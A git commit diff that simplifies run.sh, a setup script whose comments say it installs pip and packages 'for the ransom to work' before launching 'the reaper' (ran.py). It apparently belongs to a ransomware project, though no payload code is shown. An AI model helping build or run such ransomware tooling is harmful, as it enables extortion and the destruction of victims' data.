a0b6f4c170a2d591e72f1f66be2f303fe78782d7
IVBecy <57770911+IVBecy@users.noreply.github.com>
2021-01-24 19:44:30 +0000

    Added txt file for packages and edited .sh file

--- run.sh
+++ run.sh
@@ -1,21 +1,5 @@
 # Download packages and pip for the ransom to work
-url="https://bootstrap.pypa.io/get-pip.py"
-echo "[+] Downloading the PIP script"
-curl ${url} -o get-pip.py
-echo "[+] PIP is now downloaded..."
+curl "https://bootstrap.pypa.io/get-pip.py" -o get-pip.py
 python get-pip.py
-echo "[+] PIP is up"
-#Listing the packages
-declare -A packs
-packs=(
-  [fernet]="fernet"
-  [json]="json"
-)
-# Loop through package list and install
-echo "[!] Installing all the packages"
-for i in ${!packs[@]}; do
-  echo "[!] Installing ${packs[$i]}"
-  python -m pip install ${packs[$i]}
-done
-echo "[!] Downloading is done. Running the reaper...."
+pip install -r requirements.txt
 python ran.py -t
